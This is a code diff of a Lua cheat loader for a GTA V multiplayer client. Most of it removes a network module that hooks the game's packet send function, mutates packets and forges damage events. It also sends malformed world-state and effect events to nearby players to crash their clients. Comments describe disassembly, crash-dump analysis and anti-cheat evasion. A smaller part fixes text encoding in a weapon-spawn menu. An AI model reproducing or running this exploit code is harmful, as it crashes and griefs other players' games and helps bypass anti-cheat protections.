-        end
-        return true
-    end
-
-    local function sniff_cb(get)
-        local hash = get(2)
-        if hash ~= HASH then return nil end
-        local ptr = get(3)
-        local len = get(4)
-        if type(ptr) ~= "number" or type(len) ~= "number" or len < HEADER then return nil end
-        local idx = read_u8(ptr + 4)
-        local elem = read_u16(ptr + 5)
-        local size = read_u16(ptr + 7)
-        if type(idx) ~= "number" or type(elem) ~= "number" then return nil end
-        NET.seen = NET.seen or {}
-        NET.seen[idx .. ":" .. elem] = { idx, elem }
-        NET.sniffCount = (NET.sniffCount or 0) + 1
-        if NET.sniffCount <= 20 then
-            O.log("net probe: array %d elem %d size %s", idx, elem, tostring(size))
-        end
-        return nil
-    end
-
-    local function mutate_cb(get)
-        local hash = get(2)
-        if hash ~= HASH then return nil end
-        local ptr = get(3)
-        local len = get(4)
-        if type(ptr) ~= "number" or type(len) ~= "number" or len < HEADER then return nil end
-        local idx = read_u8(ptr + 4)
-        local elem = read_u16(ptr + 5)
-        local size = read_u16(ptr + 7)
-        if type(idx) ~= "number" or type(elem) ~= "number" or type(size) ~= "number" then
-            return nil
-        end
-        if size <= 0 or size > 128 then return nil end
-        NET.seen = NET.seen or {}
-        NET.seen[idx .. ":" .. elem] = { idx, elem }
-        local bytes = {}
-        for i = 1, size do bytes[i] = 0xFF end
-        local okw, wrote = pcall(Susano.Memory.WriteBytes, ptr + HEADER, bytes)
-        if okw and wrote ~= false then
-            NET.sniffCount = (NET.sniffCount or 0) + 1
-            NET.mutated = (NET.mutated or 0) + 1
-        end
-        return nil
-    end
-
-    -- Sniffer for outgoing msgNetGameEventV2 (0x2B513E19). The game itself
-    -- emits SCRIPT_WORLD_STATE_EVENT for rope, PtFX, road nodes, car gens,
-    -- pop areas, etc. Capturing one gives the real ScEvent bitstream instead
-    -- of a guess, and it can be replayed verbatim afterwards.
-    NET.captured = {}
-    NET.capLimit = 20
-
-    local function save_captured()
-        if type(Susano) ~= "table" or type(Susano.WriteFile) ~= "function" then return end
-        local list = NET.captured or {}
-        pcall(Susano.WriteFile, "netsniff.ssn", table.concat(list, "\n"))
-    end
-
-    local function sniff_event_cb(get)
-        -- No native, no logging, no file IO: hooks run on the game's thread.
-        if NET.sniffStop then return nil end
-        if NET.captured and #NET.captured >= (NET.capLimit or 20) then
-            NET.sniffStop = true
-            return nil
-        end
-        local ptr = get(3)
-        local len = get(4)
-        if type(ptr) ~= "number" or type(len) ~= "number" then return nil end
-        if len < 12 or len > 1200 then return nil end
-        local magic = read_u32(ptr)
-        if magic ~= 0x2B513E19 then return nil end
-        local n = math.min(len, 1024)
-        local ok, bytes = pcall(Susano.Memory.ReadBytes, ptr, n)
-        if not ok or type(bytes) ~= "table" or #bytes == 0 then return nil end
-        local hex = {}
-        for i = 1, #bytes do hex[i] = ("%02x"):format(bytes[i] % 256) end
-        NET.captured[#NET.captured + 1] = table.concat(hex)
-        return nil
-    end
-
-    function NET.sniffEvents(seconds)
-        NET.captured = {}
-        NET.sniffStop = false
-        local span = tonumber(seconds) or 60
-        local ok = run_window(sniff_event_cb, span, "sniff")
-        O.log("net sniff: close the menu yourself, %d s window", span)
-        Citizen.CreateThread(function()
-            local deadline = GetGameTimer() + span * 1000 + 3000
-            local logged = 0
-            while GetGameTimer() < deadline do
-                Citizen.Wait(150)
-                local list = NET.captured or {}
-                if #list > logged then
-                    for i = logged + 1, #list do O.log("net event #%d %s", i, list[i]) end
-                    logged = #list
-                    save_captured()
-                end
-                if NET.sniffStop then break end
-            end
-            save_captured()
-            O.log("net sniff: %d captured, saved to netsniff.ssn", #(NET.captured or {}))
-        end)
-        return ok
-    end
-
-    function NET.dumpEvents()
-        local list = NET.captured or {}
-        if #list == 0 and type(Susano) == "table" and type(Susano.ReadFile) == "function" then
-            local ok, raw = pcall(Susano.ReadFile, "netsniff.ssn")
-            if ok and type(raw) == "string" and #raw > 0 then
-                for line in raw:gmatch("[^\r\n]+") do list[#list + 1] = line end
-                NET.captured = list
-            end
-        end
-        local lines = { ("net event dump: %d captured"):format(#list) }
-        for i = 1, #list do
-            lines[#lines + 1] = ("ev %d: %s"):format(i, list[i])
-        end
-        for i = 1, #lines do O.log("%s", lines[i]) end
-        if type(Susano) == "table" and type(Susano.CopyToClipboard) == "function" then
-            pcall(Susano.CopyToClipboard, table.concat(lines, "\n"))
-        end
-        return #list
-    end
-
-    local function run_window(callback, seconds, label)
-        if NET.busy or NET.releasePending then O.log("net: lane busy"); return false end
-        if not NET.init() then O.log("net: net.dll not ready"); return false end
-        if not install_hook(NET.sendFn, "v:pipl", callback) then
-            O.log("net: SendReliablePacket hook failed")
-            return false
-        end
-        NET.sniffCount = 0
-        NET.mutated = 0
-        NET.busy = true
-        if label == "mutate" then
-            O.log("net mutate: fire one shot during the window")
-        end
-        local span = tonumber(seconds) or 12
-        Citizen.CreateThread(function()
-            local deadline = GetGameTimer() + span * 1000
-            while GetGameTimer() < deadline and not NET.releasePending
-                  and not (label == "sniff" and NET.sniffStop) do
-                Citizen.Wait(100)
-            end
-            Citizen.Wait(60)
-            if NET.hookId ~= nil then unhook_now() end
-            NET.busy = false
-            O.log("net %s: seen %d, mutated %d", label, NET.sniffCount or 0, NET.mutated or 0)
-        end)
-        return true
-    end
-
-    function NET.probe(seconds)
-        return run_window(sniff_cb, seconds or 12, "probe")
-    end
-
-    function NET.mutate(seconds)
-        return run_window(mutate_cb, seconds or 12, "mutate")
-    end
-
-    function NET.watch(seconds)
-        local sid = (type(Menu) == "table") and Menu.SelectedPlayer or nil
-        if type(sid) ~= "number" then return false end
-        Citizen.CreateThread(function()
-            local deadline = GetGameTimer() + (tonumber(seconds) or 30) * 1000
-            while GetGameTimer() < deadline do
-                Citizen.Wait(500)
-                local p = GetPlayerFromServerId(sid)
-                if type(p) ~= "number" or p < 0 then
-                    O.log("net: target %d gone", sid)
-                    return
-                end
-                if type(NetworkIsPlayerActive) == "function" and not NetworkIsPlayerActive(p) then
-                    O.log("net: target %d left", sid)
-                    return
-                end
-            end
-            O.log("net: target %d still connected", sid)
-        end)
-        return true
-    end
-
-    local function netToast(text)
-        -- The loader overlay toast first: it is the same surface the rest of
-        -- the menu uses, and it does not depend on the text natives (the
-        -- evasion block stubs several of them globally).
-        pcall(Notify, tostring(text))
-        if type(BeginTextCommandThefeedPost) ~= "function"
-            or type(AddTextComponentSubstringPlayerName) ~= "function"
-            or type(EndTextCommandThefeedPostTicker) ~= "function" then
-            return
-        end
-        pcall(BeginTextCommandThefeedPost, "STRING")
-        pcall(AddTextComponentSubstringPlayerName, tostring(text))
-        pcall(EndTextCommandThefeedPostTicker, false, true)
-    end
-
-    -- Force the target into ragdoll. The crash dump shows the AV inside the
-    -- weapon/refcount path (or word [ptr+0x214], 0x20) with ptr == 0xC0800000,
-    -- which is exactly float -4.0f: the damage float ended up where a pointer
-    -- was expected. The dump was taken while the victim was lying down. So the
-    -- prerequisite is a ragdolled target, and the payload is a damage of -4.0.
-    function NET.ragdoll(ped)
-        if type(Susano) ~= "table" or type(Susano.RequestRagdoll) ~= "function" then
-            return false
-        end
-        if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
-            return false
-        end
-        return (pcall(Susano.RequestRagdoll, ped)) and true or false
-    end
-
-    -- Synthetic damage event, anchored at the victim with the victim as both
-    -- source and target. The server forwards the event to the clients that have
-    -- the target in scope; the operator stays 250 m away, outside that scope.
-    -- No local entity, no outgoing buffer, no array: this is the operator-safe
-    -- lane. The variant fuzzes the fields the receiver feeds into its damage
-    -- resolver: flags, actionResultHash/Id, actionUnk, hitComponent.
-    function NET.damage(v)
-        if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
-            return false
-        end
-        if type(C) ~= "table" or type(C.target) ~= "function" then return false end
-        local okT, entry = pcall(C.target, "ped")
-        if not okT or type(entry) ~= "table" then return false end
-        local ped = entry.ped
-        local me = PlayerPedId()
-        if type(ped) ~= "number" or ped == 0 or ped == me then return false end
-        if not DoesEntityExist(ped) then return false end
-        local coords = GetEntityCoords(ped)
-        local x, y, z = coords and coords.x, coords and coords.y, coords and coords.z
-        if type(x) ~= "number" or type(y) ~= "number" or type(z) ~= "number" then
-            return false
-        end
-        if type(v) ~= "table" then v = { dmg = tonumber(v) or 1.0 } end
-        local okc = pcall(Susano.SendNetworkDamage, ped, ped, x, y, z,
-            v.dmg or 1.0, v.wpn or 0, v.flags or 522,
-            v.arh or 0, v.ari or 0, v.au or 0, v.hc or 0)
-        return okc
-    end
-
-    -- The target picker for the crash lane. It does NOT use C.target: that
-    -- one is gated by PED.minDist (250 m), which is the operator-safe window
-    -- for the swarm. A crash target has to be streamed, so we take the player
-    -- selected in the menu first, then the closest active player under 200 m.
-    local function crashTarget()
-        local sid = (type(Menu) == "table") and Menu.SelectedPlayer or nil
-        if type(sid) == "number" then
-            local okP, p = pcall(GetPlayerFromServerId, sid)
-            if okP and type(p) == "number" and p >= 0 and p ~= PlayerId() then
-                local okPed, ped = pcall(GetPlayerPed, p)
-                if okPed and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then
-                    return ped, sid
-                end
-            end
-        end
-        local me = PlayerPedId()
-        local my = GetEntityCoords(me)
-        if type(my) ~= "table" and type(my) ~= "vector3" and type(my) ~= "userdata" then
-            return nil
-        end
-        local best, bestD = nil, 200.0
-        for _, p in ipairs(GetActivePlayers()) do
-            if p ~= PlayerId() then
-                local ped = GetPlayerPed(p)
-                if DoesEntityExist(ped) then
-                    local c = GetEntityCoords(ped)
-                    local dx = (c.x or 0) - (my.x or 0)
-                    local dy = (c.y or 0) - (my.y or 0)
-                    local dz = (c.z or 0) - (my.z or 0)
-                    local d = math.sqrt(dx * dx + dy * dy + dz * dz)
-                    if d < bestD then best, bestD = ped, d end
-                end
-            end
-        end
-        return best
-    end
-
-    -- Every active player we can see inside `radius`, as server ids. The crash
-    -- lane needs the list twice (blind payload set, typed world-state sweep), so
-    -- it lives here instead of inline.
-    local function crashIds(radius)
-        local me = PlayerPedId()
-        if type(me) ~= "number" or me == 0 then return {} end
-        local my = GetEntityCoords(me)
-        local mySid = GetPlayerServerId(PlayerId())
-        local ids = {}
-        for _, p in ipairs(GetActivePlayers()) do
-            if p ~= PlayerId() then
-                local ped = GetPlayerPed(p)
-                if DoesEntityExist(ped) then
-                    local c = GetEntityCoords(ped)
-                    local dx = (c.x or 0) - (my.x or 0)
-                    local dy = (c.y or 0) - (my.y or 0)
-                    local dz = (c.z or 0) - (my.z or 0)
-                    if math.sqrt(dx * dx + dy * dy + dz * dz) <= (radius or 200.0) then
-                        local sid = GetPlayerServerId(p)
-                        if type(sid) == "number" and sid >= 0 and sid < 1024
-                           and sid ~= mySid then
-                            ids[#ids + 1] = sid
-                        end
-                    end
-                end
-            end
-        end
-        return ids
-    end
-
-    -- SCRIPT_WORLD_STATE_EVENT is the only event whose payload is a tagged
-    -- union: 4 bits of world-state type, 1 bit flag, then whatever that type's
-    -- deserializer consumes. The old crash set spent its first byte on raw
-    -- guesses, so 6 of the 8 variants decoded as type 0 and one as type 15 -
-    -- which 0x10A6388 rejects outright (it returns NULL above 8). This emits
-    -- the tag explicitly so the 9 reachable types can be swept one at a time
-    -- and a victim crash message can be matched to a type.
-    function NET.wsSend(t, fill, n)
-        t = math.floor(tonumber(t) or 0) % 9
-        fill = math.floor(tonumber(fill) or 0) % 256
-        n = math.floor(tonumber(n) or 48)
-        local data = NET.bits({ { bits = 4, val = t }, { bits = 1, val = 1 } })
-        if type(data) ~= "table" then return false end
-        for _ = 1, n do data[#data + 1] = fill end
-        local ids = crashIds(200.0)
-        if #ids == 0 then
-            O.log("net ws: no player in 200 m")
-            return false
-        end
-        local list = {}
-        for i = 1, #ids do list[i] = tostring(ids[i]) end
-        O.log("net ws: type %d fill %02X %d bytes -> %d [%s]",
-              t, fill, n, #ids, table.concat(list, ","))
-        return NET.emitEvent(ids, 0xC00B8EB5, 33, data)
-    end
-
-    -- NETWORK_PTFX probe. The effect is resolved from hashB through a global
-    -- bucket table and hashA goes straight into the PtFx start, so the two
-    -- variants worth separating are "nothing resolves" (both zero) and "an
-    -- asset name that exists" (joaat of a core effect asset). A DLC-resolved
-    -- asset is the path that reaches CExtraContentWrapper::INIT__SESSION, which
-    -- is the class named in the victim crash.
-    function NET.ptfxProbe(which)
-        local ids = crashIds(200.0)
-        if #ids == 0 then
-            O.log("net ptfx: no player in 200 m")
-            return false
-        end
-        which = math.floor(tonumber(which) or 0) % 4
-        local core = NET.joaat("core")
-        local opts
-        if which == 0 then
-            opts = { hashA = 0, hashB = 0, enumA = 0, enumB = 0 }
-        elseif which == 1 then
-            opts = { hashA = 0xFFFFFFFF, hashB = 0xFFFFFFFF, enumA = 0x7FFFF, enumB = 0x7FFFF }
-        elseif which == 2 then
-            opts = { hashA = core, hashB = core }
-        else
-            opts = { hashA = 0, hashB = core }
-        end
-        local data = NET.bits(NET.ptfx(opts))
-        if type(data) ~= "table" then return false end
-        local list = {}
-        for i = 1, #ids do list[i] = tostring(ids[i]) end
-        O.log("net ptfx: v%d hashA=%08X hashB=%08X %d bytes -> %d [%s]",
-              which, opts.hashA, opts.hashB, #data, #ids, table.concat(list, ","))
-        return NET.emitEvent(ids, NET.EV[74], 74, data)
-    end
-
-    -- Field widths, in wire order, for the handlers whose whole read chain
-    -- resolved inside the dumped window. Each number is one Read call in the
-    -- handler's body, recovered from the disassembly and matched against the
-    -- pdata bounds of the function. Handlers that delegate to a helper outside
-    -- the window, or that read inside a loop, are deliberately absent: a wrong
-    -- width desynchronises the stream and the receiver would be parsing
-    -- whatever follows, which tells us nothing about the event itself.
-    NET.W = {
-        [4]  = "13,32,13,13,1",
-        [7]  = "13,13,1",
-        [15] = "13,13,5,1,1,13",
-        [19] = "13,32,4",
-        [20] = "13,32",
-        [21] = "16",
-        [23] = "13,8",
-        [24] = "13,32,13,13,1",
-        [27] = "13,3",
-        [34] = "19,15,11",
-        [35] = "19,19",
-        [36] = "32,13,13,1",
-        [38] = "32,13,13,1",
-        [39] = "32,8",
-        [43] = "13,1",
-        [48] = "8,32",
-        [52] = "8,32,32",
-        [53] = "32,19",
-        [59] = "32,32",
-        [60] = "8,32,32,1",
-        [61] = "32,32,32",
-        [62] = "13,32,13,13,1",
-        [63] = "13,32,13,13,1",
-        [65] = "3,32",
-        [66] = "13,13,32,1,1",
-        [68] = "4,13,13,13",
-        [69] = "4,13,13,13",
-        [74] = "32,32,19,19,10,3,1,13,1,32,1,8,8,8,1,8",
-        [76] = "3,16",
-        [78] = "13,19,19,32,1",
-        [79] = "3,13,6,8",
-        [82] = "32,32",
-        [84] = "13,3",
-        [85] = "13,1",
-    }
-
-    function NET.widths(id)
-        local s = NET.W[tonumber(id) or -1]
-        if not s then return nil end
-        local t = {}
-        for w in s:gmatch("%d+") do t[#t + 1] = tonumber(w) end
-        if #t == 0 then return nil end
-        return t
-    end
-
-    -- Build a payload that matches the receiver's own read order exactly and
-    -- fills every field with one repeated value. Fill 0 gives a well-formed
-    -- empty event, 0xFF a well-formed event with every field at its ceiling.
-    function NET.evBlob(id, fill)
-        local ws = NET.widths(id)
-        if not ws then return nil end
-        local v = tonumber(fill) or 0
-        local spec = {}
-        for i = 1, #ws do spec[i] = { bits = ws[i], val = v } end
-        return spec
-    end
-
-    function NET.evSend(id, fill, first, tail16, field)
-        id = tonumber(id) or 0
-        local ids = crashIds(200.0)
-        if #ids == 0 then
-            O.log("net ev: no player in 200 m")
-            return false
-        end
-        if not NET.EV[id] then
-            O.log("net ev: id %d is registered with no handler", id)
-            return false
-        end
-        local spec = NET.evBlob(id, fill)
-        if not spec then
-            O.log("net ev: no width table for id %d", id)
-            return false
-        end
-        if first then
-            local slot = math.floor(tonumber(field) or 1)
-            if spec[slot] then spec[slot].val = tonumber(first) or 0 end
-        end
-        local data = NET.bits(spec)
-        if type(data) ~= "table" then return false end
-        local list = {}
-        for i = 1, #ids do list[i] = tostring(ids[i]) end
-        O.log("net ev: id %d (%s) fill 0x%02X first %s tail %s %d bytes -> %d [%s]",
-              id, NET.NAMES[id] or "?", fill & 0xFF,
-              first and tostring(first) or "-",
-              tail16 and tostring(tail16) or "0",
-              #data, #ids, table.concat(list, ","))
-        return NET.emitEvent(ids, NET.EV[id], id, data, tail16)
-    end
-
-    -- Nearest other player's entity, as a network id.
-    --
-    -- The handlers resolve their leading 13-bit field through the same network
-    -- object table this client uses, so a value invented on the wire simply
-    -- fails the lookup and the handler returns without doing anything. That is
-    -- exactly what the 0xFF fills did: every field at its ceiling, no entity
-    -- behind the id, no effect. To reach the body of a handler the id has to
-    -- be one this client can see, which means asking the game for it.
-    --
-    -- Every call is wrapped: a native that is missing or that throws must not
-    -- take the loader down, and the caller only ever sees nil.
-    function NET.nearestNet(kind)
-        local okP, me = pcall(PlayerId)
-        if not okP then return nil end
-        local okPed, myPed = pcall(PlayerPedId)
-        if not okPed or not myPed or myPed == 0 then return nil end
-        local okC, pc = pcall(GetEntityCoords, myPed)
-        if not okC or not pc then return nil end
-        local px = pc.x or pc[1] or 0.0
-        local py = pc.y or pc[2] or 0.0
-        local pz = pc.z or pc[3] or 0.0
-        local okL, list = pcall(GetActivePlayers)
-        if not okL or type(list) ~= "table" then return nil end
-        local best, bestD = 0, 250.0
-        for i = 1, #list do
-            local p = list[i]
-            if p ~= me then
-                local okp, ped = pcall(GetPlayerPed, p)
-                if okp and ped and ped ~= 0 then
-                    local ent = 0
-                    if kind == "vehicle" then
-                        local okv, veh = pcall(GetVehiclePedIsIn, ped, false)
-                        if okv and veh and veh ~= 0 then ent = veh end
-                    else
-                        ent = ped
-                    end
-                    if ent ~= 0 then
-                        local okc, c = pcall(GetEntityCoords, ent)
-                        if okc and c then
-                            local dx = (c.x or c[1] or 0.0) - px
-                            local dy = (c.y or c[2] or 0.0) - py
-                            local dz = (c.z or c[3] or 0.0) - pz
-                            local d = math.sqrt(dx * dx + dy * dy + dz * dz)
-                            if d < bestD then bestD, best = d, ent end
-                        end
-                    end
-                end
-            end
-        end
-        if best == 0 then return nil end
-        local okn, nid = pcall(NetworkGetNetworkIdFromEntity, best)
-        if not okn or type(nid) ~= "number" or nid <= 0 then return nil end
-        return nid, bestD
-    end
-
-    -- Candidats au crash, tries par ce que l'analyse statique permet d'esperer.
-    --
-    -- Aucun d'eux ne peut etre designe comme "celui qui marche" sans essai :
-    -- la couche Read est prouvee sans danger (F39/F40), donc tout ce qui reste
-    -- est le code d'application, et rien hors ligne ne dit lequel dereference
-    -- une donnee non verifiee. Ce qui a change, c'est que depuis r20 les
-    -- paquets atteignent reellement ce code pour la premiere fois.
-    --
-    --   ent = "ped" / "vehicle"  le premier champ est un id d'entite : il faut
-    --                            un id que le client peut resoudre, sinon le
-    --                            handler sort avant d'avoir rien fait.
-    --   ent = nil                le payload ne porte que des hashes ou des
-    --                            scalaires, donc il s'applique aussi bien a
-    --                            une cible a pied qu'en vehicule.
-    local CANDIDATES = {
-        -- PtFX world state : trois hashes d'asset nus, aucun id d'entite. Le
-        -- chemin le plus court vers une resolution d'asset DLC, donc vers la
-        -- classe nommee dans le crash victime.
-        { id = 61, fill = 0xFF },
-        -- PtFX d'evenement : le hash passe directement au demarrage d'effet.
-        { id = 74, fill = 0xFF },
-        -- Un id de ped dans un champ qui attend un vehicule : le seul test qui
-        -- dise si le handler verifie le type d'objet.
-        { id = 66, fill = 0xFF, ent = "ped" },
-        { id = 15, fill = 0xFF, ent = "ped" },
-        { id = 27, fill = 0xFF, ent = "ped" },
-        -- Airdefense : 32 bits de hash puis 19 bits d'index.
-        { id = 53, fill = 0xFF },
-        -- Zones : rayon et centre maximises, application immediate.
-        { id = 34, fill = 0xFF },
-        { id = 35, fill = 0xFF },
-        -- Verrou vehicule / sceances synchronisees / projectile.
-        { id = 60, fill = 0xFF },
-        { id = 36, fill = 0xFF },
-        { id = 19, fill = 0xFF, ent = "ped" },
-        { id = 78, fill = 0xFF },
-        { id = 43, fill = 0xFF, ent = "ped" },
-        -- PED_PLAY_PAIN starts with a 3-bit field, so the ped id goes in the
-        -- second one. Writing it into the first would mask it to three bits and
-        -- address an entity that cannot exist.
-        { id = 79, fill = 0xFF, ent = "ped", field = 2 },
-    }
-
-    -- net.dll!SendReliablePacket is 59 instructions and this is all that
-    -- matters from them:
-    --
-    --   0x18004C5F2  call 180086c40        ; acquire [this+0x30]
-    --   0x18004C607  mov  rdi,[rbx+0x20]   ; transport object
-    --   0x18004C622  test rdi,rdi
-    --   0x18004C625  je   0x18004c63a     ; null -> do nothing at all
-    --   0x18004C627  mov  rax,[rdi]
-    --   0x18004C636  call qword ptr [rax+0x30]  ; the real send
-    --
-    -- So a send can be "accepted" by the caller, return 1, and still move no
-    -- byte, because the transport pointer is null. Nothing above this line
-    -- could see that. Reading the three pointers is the check that separates
-    -- "queued" from "discarded".
-    function NET.transport()
-        local inst = NET.resolve_instance()
-        if not inst then return nil end
-        local tr = read_u64(inst + 0x20)
-        local rc = read_u64(inst + 0x28)
-        local vt = (tr and tr > 0x10000) and read_u64(tr) or 0
-        local fn = (vt and vt > 0x10000) and read_u64(vt + 0x30) or 0
-        return tr, rc, vt, fn
-    end
-
-    function NET.transportLog(tag)
-        local tr, rc, vt, fn = NET.transport()
-        O.log("net probe: %s transport=0x%X ref=0x%X vt=0x%X send=0x%X",
-              tag or "-", tr or 0, rc or 0, vt or 0, fn or 0)
-    end
-
-    -- One pass, ordered by how much each step tells us.
-    --
-    -- 0) Delivery probe. PED_PLAY_PAIN on the nearest other player's ped, sent
-    --    in the three target forms GTA understands:
-    --      - 0xFFFF : the broadcast sentinel;
-    --      - {}     : count 0;
-    --      - {sid}  : a real id, the form used until now.
-    --    It is the only candidate whose effect is immediately visible and which
-    --    needs no authority over the object: the owner of the ped applies the
-    --    pain. If the ped flinches, the whole chain works and the only thing
-    --    that was wrong is the shape of the target list.
-    -- 1) tail16 matrix on the same event: 0, our own id, 0xFFFF. Those two
-    --    bytes are the only part of the event object nothing explains.
-    -- 2) World state, types 0..8. Only family where the first four bits pick
-    --    the deserializer, and type 1 is CNetworkPtFXWorldStateData, which
-    --    carries asset hashes - the DLC resolution path.
-    -- 3) The fourteen event candidates.
-    local function painData(pedNetId)
-        local spec = NET.evBlob(79, 0)
-        if not spec then return nil end
-        spec[1].val = 0
-        spec[2].val = tonumber(pedNetId) or 0
-        spec[3].val = 0
-        spec[4].val = 0
-        return NET.bits(spec)
-    end
-
-    function NET.sweep()
-        if NET.sweeping then
-            NET.sweeping = false
-            O.log("net sweep: stopping")
-            return false
-        end
-        NET.sweeping = true
-        NET.transportLog("sweep")
-        Citizen.CreateThread(function()
-            local nid, dist = NET.nearestNet("ped")
-            local okS, sid = pcall(GetPlayerServerId, PlayerId())
-            if not (okS and type(sid) == "number") then sid = nil end
-
-            if nid then
-                local data = painData(nid)
-                O.log("net probe: pain on ped %d at %.1f m", nid, tonumber(dist) or -1)
-                O.log("net probe: target 0xFFFF")
-                NET.emitEvent({ 0xFFFF }, NET.EV[79], 79, data, 0)
-                Citizen.Wait(700)
-                O.log("net probe: target count 0")
-                NET.emitEvent({}, NET.EV[79], 79, data, 0)
-                Citizen.Wait(700)
-                if sid then
-                    O.log("net probe: target %d", sid)
-                    NET.emitEvent({ sid }, NET.EV[79], 79, data, 0)
-                    Citizen.Wait(700)
-                    for _, tail in ipairs({ 0, sid, 0xFFFF }) do
-                        if not NET.sweeping then break end
-                        O.log("net probe: tail16 %d", tail)
-                        NET.emitEvent({ sid }, NET.EV[79], 79, data, tail)
-                        Citizen.Wait(700)
-                    end
-                end
-            else
-                O.log("net probe: no ped nearby")
-            end
-
-            for t = 0, 8 do
-                if not NET.sweeping then break end
-                O.log("net sweep: ws type %d", t)
-                NET.wsSend(t, 0xFF, 48)
-                Citizen.Wait(800)
-            end
-
-            local n = 0
-            while NET.sweeping and n < #CANDIDATES do
-                n = n + 1
-                local c = CANDIDATES[n]
-                local first = nil
-                if c.ent then
-                    local e, d = NET.nearestNet(c.ent)
-                    if e then
-                        first = e
-                    else
-                        O.log("net sweep: %d/%d id %d skipped, no %s",
-                              n, #CANDIDATES, c.id, c.ent)
-                    end
-                end
-                if not c.ent or first then
-                    O.log("net sweep: %d/%d id %d (%s)",
-                          n, #CANDIDATES, c.id, NET.NAMES[c.id] or "?")
-                    NET.evSend(c.id, c.fill, first, c.tail, c.field)
-                end
-                Citizen.Wait(700)
-            end
-            NET.sweeping = false
-            O.log("net sweep: done")
-        end)
-        return true
-    end
-
-    function NET.kill()
-        return NET.sweep()
-    end
-
-    function NET.crash()
-        local stamp = GetGameTimer()
-        if NET.crashAt and stamp - NET.crashAt < 4000 then
-            O.log("net crash: cooling down")
-            return false
-        end
-        NET.crashAt = stamp
-        local me = PlayerPedId()
-        if type(me) ~= "number" or me == 0 then
-            O.log("net crash: no local ped")
-            netToast("Net crash: no local ped")
-            return false
-        end
-        local my = GetEntityCoords(me)
-
-        -- Target net ids: every active player that we can see under 200 m.
-        -- The server filters targetPlayers with IsClientRelevantEntity and the
-        -- routing bucket, so the list may be trimmed; send to all of them.
-        local ids = {}
-        local mySid = GetPlayerServerId(PlayerId())
-        for _, p in ipairs(GetActivePlayers()) do
-            if p ~= PlayerId() then
-                local ped = GetPlayerPed(p)
-                if DoesEntityExist(ped) then
-                    local c = GetEntityCoords(ped)
-                    local dx = (c.x or 0) - (my.x or 0)
-                    local dy = (c.y or 0) - (my.y or 0)
-                    local dz = (c.z or 0) - (my.z or 0)
-                    if math.sqrt(dx * dx + dy * dy + dz * dz) <= 200.0 then
-                        local sid = GetPlayerServerId(p)
-                        if type(sid) == "number" and sid >= 0 and sid < 1024
-                           and sid ~= mySid then
-                            ids[#ids + 1] = sid
-                        end
-                    end
-                end
-            end
-        end
-        if #ids == 0 then
-            O.log("net crash: no player in 200 m")
-            netToast("Net crash: no player in 200 m")
-            return false
-        end
-
-        -- 1) the visible emote: the operator lies down.
-        NET.scenarioEmote()
-        local list = {}
-        for i = 1, #ids do list[i] = tostring(ids[i]) end
-        O.log("net crash: scenario + world state on %d players [%s]",
-              #ids, table.concat(list, ","))
-        netToast(("Net crash: world state on %d players"):format(#ids))
-
-        -- 2) the payload: SCRIPT_WORLD_STATE_EVENT (event name hash
-        -- 0xC00B8EB5). The client event is blacklisted for sending, but the
-        -- raw msgNetGameEventV2 packet routes it: the server relays the data
-        -- verbatim and each receiver Handle()s it as a CNetworkScriptWorldState.
-        -- The dump put a -4.0 float where a refcounted object pointer was
-        -- expected, so the payload carries -4.0 and world-state type guesses.
-        -- SCRIPT_WORLD_STATE_EVENT is GTA net event id 33. The receiver
-        -- dispatches on eventId, not on eventNameHash: the server copies
-        -- eventId verbatim (NetGameEventPacketHandlerV2) and the client
-        -- handler is looked up by that index. Sending 1..N, as the first
-        -- version did, delivered nothing at all.
-        local EVENT = 0xC00B8EB5
-        local EVENT_ID = 33
-        local payloads = {
-            {},
-            { 0x00, 0x00, 0x00, 0x00 },
-            { 0x00, 0x00, 0x80, 0xC0 },
-            { 0x04, 0x00, 0x00, 0x00 },
-            { 0xFF, 0xFF, 0xFF, 0xFF },
-            { 0x29, 0x9C, 0x38, 0x39 },
-            { 0x00, 0x00, 0x80, 0xC0, 0x00, 0x00, 0x80, 0xC0 },
-            { 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xC0 },
-        }
-
-        Citizen.CreateThread(function()
-            local sent = 0
-            for i = 1, #payloads do
-                if NET.emitEvent(ids, EVENT, EVENT_ID, payloads[i]) then sent = sent + 1 end
-                Citizen.Wait(900)
-            end
-            O.log("net crash: %d/%d world state events", sent, #payloads)
-            netToast(("Net crash: %d/%d world state"):format(sent, #payloads))
-        end)
-        return true
-    end
-
-    return NET
-end)(O, C)
 
 -- ---------------------------------------------------------------------------
 -- PART: 11_flash.lua
@@ -25928,7 +23291,6 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-30-r45 (density ladder + busy guard)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -26083,7 +23445,7 @@ local _weapons = {
         {n="Gusenberg",          h="WEAPON_GUSENBERG"},
         {n="Minigun",            h="WEAPON_MINIGUN"},
     }},
-    {cat=" Corps-Ã -corps", items={
+    {cat=" Corps-à-corps", items={
         {n="Knife",              h="WEAPON_KNIFE"},
         {n="Nightstick",         h="WEAPON_NIGHTSTICK"},
         {n="Hammer",             h="WEAPON_HAMMER"},
@@ -26168,8 +23530,8 @@ local function _giveWeapon(weaponHash, ammo)
     end
 end
 
-local _wepMenu      = SEED.Classes.xMenu('admin_spawn_weapon_menu',      'Armes',   'CatÃ©gories')
-local _wepSearchMenu= SEED.Classes.xMenu('admin_spawn_weapon_search_menu','Recherche arme', 'RÃ©sultats')
+local _wepMenu      = SEED.Classes.xMenu('admin_spawn_weapon_menu',      'Armes',   'Catégories')
+local _wepSearchMenu= SEED.Classes.xMenu('admin_spawn_weapon_search_menu','Recherche arme', 'Résultats')
 local _catMenus     = {}
 
 for i = 1, #_weapons do
@@ -26178,16 +23540,16 @@ for i = 1, #_weapons do
 
     for j = 1, #catData.items do
         local w = catData.items[j]
-        catMenu:AddButton(w.n):SetRightText('â†’'):on('buttonPress', function()
+        catMenu:AddButton(w.n):SetRightText('→'):on('buttonPress', function()
             _giveWeapon(w.h, 9999)
         end)
     end
 
     _catMenus[i] = catMenu
-    _wepMenu:AddSubmenu(catMenu):SetRightText('âž¤')
+    _wepMenu:AddSubmenu(catMenu):SetRightText('➤')
 end
 
